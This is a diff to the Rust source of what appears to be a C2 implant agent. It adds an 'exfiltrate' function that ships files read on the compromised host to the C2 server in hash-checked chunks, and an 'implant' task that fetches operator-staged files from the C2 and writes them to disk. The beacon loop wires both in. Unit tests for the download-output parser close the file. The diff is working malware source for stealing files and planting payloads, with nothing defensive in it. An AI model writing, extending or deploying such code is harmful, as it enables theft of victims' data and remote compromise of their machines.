@@ -1,4 +1,6 @@
 use std::env;
+
+use base64::Engine;
 use std::process::ExitCode;
 use std::time::Duration;
 
@@ -133,25 +135,137 @@ fn jitter_sleep(base: u64, jitter: u64) {
 }
 
 fn execute_task(registry: &mut PluginRegistry, task: &Task) -> TaskResult {
-    match registry.execute(&task.command, &task.args) {
+    let started = std::time::Instant::now();
+    let mut result = match registry.execute(&task.command, &task.args) {
         Some(Ok(out)) => TaskResult {
             task_id: task.id.clone(),
             output: out.stdout,
             error: None,
             exit_code: Some(out.exit_code),
+            duration_ms: None,
         },
         Some(Err(e)) => TaskResult {
             task_id: task.id.clone(),
             output: String::new(),
             error: Some(e.to_string()),
             exit_code: None,
+            duration_ms: None,
         },
         None => TaskResult {
             task_id: task.id.clone(),
             output: String::new(),
             error: Some(format!("no plugin handles command '{}'", task.command)),
             exit_code: None,
+            duration_ms: None,
         },
+    };
+    result.duration_ms = Some(started.elapsed().as_millis() as u64);
+    result
+}
+
+/// Splits the `name|sha256|base64` form the `download` plugin produces and
+/// checks that the payload still hashes to what the plugin reported.
+fn parse_download_output(output: &str) -> Result<(String, Vec<u8>), String> {
+    let mut parts = output.splitn(3, '|');
+    let name = parts
+        .next()
+        .ok_or("exfil: malformed download output")?
+        .to_string();
+    let declared = parts.next().ok_or("exfil: malformed download output")?;
+    let encoded = parts.next().ok_or("exfil: malformed download output")?;
+
+    let data = base64::engine::general_purpose::STANDARD
+        .decode(encoded.as_bytes())
+        .map_err(|e| format!("exfil: bad base64: {e}"))?;
+
+    let actual = chamuko_protocol::sha256_hex(&data);
+    if actual != declared {
+        return Err(format!(
+            "exfil: local hash mismatch (read {declared}, decoded {actual})"
+        ));
+    }
+    Ok((name, data))
+}
+
+/// Parses the `name|sha256|base64` form produced by the agent's `download`
+/// command and pushes the file to the C2 in chunks.
+fn exfiltrate(client: &C2Client, agent_id: &str, output: &str) -> Result<String, String> {
+    let (name, data) = parse_download_output(output)?;
+    let actual = chamuko_protocol::sha256_hex(&data);
+
+    let transfer = format!("up-{}-{}", agent_id, chamuko_protocol::now_secs());
+    let chunks = chamuko_protocol::chunk_bytes(&transfer, &data);
+    let total = chunks.len();
+    let mut last = None;
+
+    for chunk in chunks {
+        last = Some(client.upload_chunk(agent_id, &name, chunk).map_err(|e| {
+            format!("exfil: chunk upload failed, transfer {transfer} incomplete: {e}")
+        })?);
+    }
+
+    let done = last.ok_or("exfil: nothing to send")?;
+    if !done.complete {
+        return Err(format!(
+            "exfil: C2 accepted {}/{} chunks only",
+            done.received, done.total
+        ));
+    }
+    if let Some(remote) = done.sha256 {
+        if remote != actual {
+            return Err(format!(
+                "exfil: C2 stored a different file (sent {actual}, stored {remote})"
+            ));
+        }
+    }
+
+    Ok(format!(
+        "exfil complete: {name} ({} bytes, {total} chunk(s), sha256 verified)",
+        data.len()
+    ))
+}
+
+/// Pulls a file the operator staged for this agent and writes it locally.
+/// The hash the C2 advertised is checked before anything touches the disk.
+fn implant(client: &C2Client, registry: &mut PluginRegistry, transfer: &str, path: &str) -> Result<String, String> {
+    let mut buffer = Vec::new();
+    let mut index = 0u32;
+    let mut expected: Option<String> = None;
+
+    loop {
+        let resp = client
+            .download_chunk(transfer, index)
+            .map_err(|e| format!("implant: chunk {index} failed: {e}"))?;
+        if let Some(hash) = resp.sha256.clone() {
+            expected = Some(hash);
+        }
+        let bytes = resp
+            .chunk
+            .bytes()
+            .map_err(|e| format!("implant: chunk {index} bad base64: {e}"))?;
+        buffer.extend_from_slice(&bytes);
+
+        index += 1;
+        if index >= resp.chunk.total {
+            break;
+        }
+    }
+
+    let actual = chamuko_protocol::sha256_hex(&buffer);
+    if let Some(want) = expected {
+        if want != actual {
+            return Err(format!(
+                "implant: hash mismatch, refusing to write (expected {want}, got {actual})"
+            ));
+        }
+    }
+
+    let encoded = base64::engine::general_purpose::STANDARD.encode(&buffer);
+    let args = vec![path.to_string(), encoded];
+    match registry.execute("upload", &args) {
+        Some(Ok(out)) => Ok(format!("{} (sha256 {actual} verified)", out.stdout)),
+        Some(Err(e)) => Err(format!("implant: write failed: {e}")),
+        None => Err("implant: upload command unavailable".to_string()),
     }
 }
 
@@ -207,7 +321,44 @@ fn run(config: &Config, registry: &mut PluginRegistry) -> Result<(), C2Error> {
 
         let mut results = Vec::with_capacity(beacon.tasks.len());
         for task in &beacon.tasks {
-            let result = execute_task(registry, task);
+            // `implant` is driven by the beacon loop, not by a plugin, so it
+            // must be handled before dispatching to the registry.
+            let mut result = if task.command == "implant" {
+                let transfer = task.args.first().cloned().unwrap_or_default();
+                let path = task.args.get(1).cloned().unwrap_or_default();
+                let started = std::time::Instant::now();
+                let outcome = implant(&client, registry, &transfer, &path);
+                let (output, error) = match outcome {
+                    Ok(note) => (note, None),
+                    Err(e) => (String::new(), Some(e)),
+                };
+                TaskResult {
+                    task_id: task.id.clone(),
+                    output,
+                    exit_code: Some(if error.is_some() { 1 } else { 0 }),
+                    error,
+                    duration_ms: Some(started.elapsed().as_millis() as u64),
+                }
+            } else {
+                execute_task(registry, task)
+            };
+
+            // The `download` plugin only read the file; the beacon loop is what
+            // actually ships it, so a failure here must fail the task.
+            if task.command == "download" && result.error.is_none() {
+                match exfiltrate(&client, &id, &result.output) {
+                    Ok(note) => {
+                        eprintln!("task {}: {note}", task.id);
+                        result.output = note;
+                    }
+                    Err(e) => {
+                        eprintln!("task {}: {e}", task.id);
+                        result.output = String::new();
+                        result.exit_code = Some(1);
+                        result.error = Some(e);
+                    }
+                }
+            }
             if let Some(err) = &result.error {
                 eprintln!("task {} error: {err}", task.id);
             }
@@ -267,5 +418,56 @@ fn main() -> ExitCode {
         ExitCode::SUCCESS
     } else {
         ExitCode::FAILURE
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use base64::Engine;
+
+    fn encode(data: &[u8]) -> String {
+        base64::engine::general_purpose::STANDARD.encode(data)
+    }
+
+    #[test]
+    fn parse_download_output_accepts_a_consistent_payload() {
+        let data = b"contenido de prueba";
+        let payload = format!(
+            "nota.txt|{}|{}",
+            chamuko_protocol::sha256_hex(data),
+            encode(data)
+        );
+        let (name, parsed) = parse_download_output(&payload).unwrap();
+        assert_eq!(name, "nota.txt");
+        assert_eq!(parsed, data);
+    }
+
+    #[test]
+    fn parse_download_output_rejects_a_tampered_hash() {
+        let payload = format!("nota.txt|{}|{}", "0".repeat(64), encode(b"x"));
+        let err = parse_download_output(&payload).unwrap_err();
+        assert!(err.contains("hash mismatch"), "got: {err}");
+    }
+
+    #[test]
+    fn parse_download_output_rejects_bad_base64() {
+        let payload = format!("a.txt|{}|no-es-base64!!", chamuko_protocol::sha256_hex(b""));
+        let err = parse_download_output(&payload).unwrap_err();
+        assert!(err.contains("bad base64"), "got: {err}");
+    }
+
+    #[test]
+    fn parse_download_output_rejects_missing_fields() {
+        assert!(parse_download_output("solo-un-campo").is_err());
+        assert!(parse_download_output("").is_err());
+    }
+
+    #[test]
+    fn parse_download_output_handles_empty_files() {
+        let payload = format!("vacio.bin|{}|", chamuko_protocol::sha256_hex(b""));
+        let (name, data) = parse_download_output(&payload).unwrap();
+        assert_eq!(name, "vacio.bin");
+        assert!(data.is_empty());
     }
 }
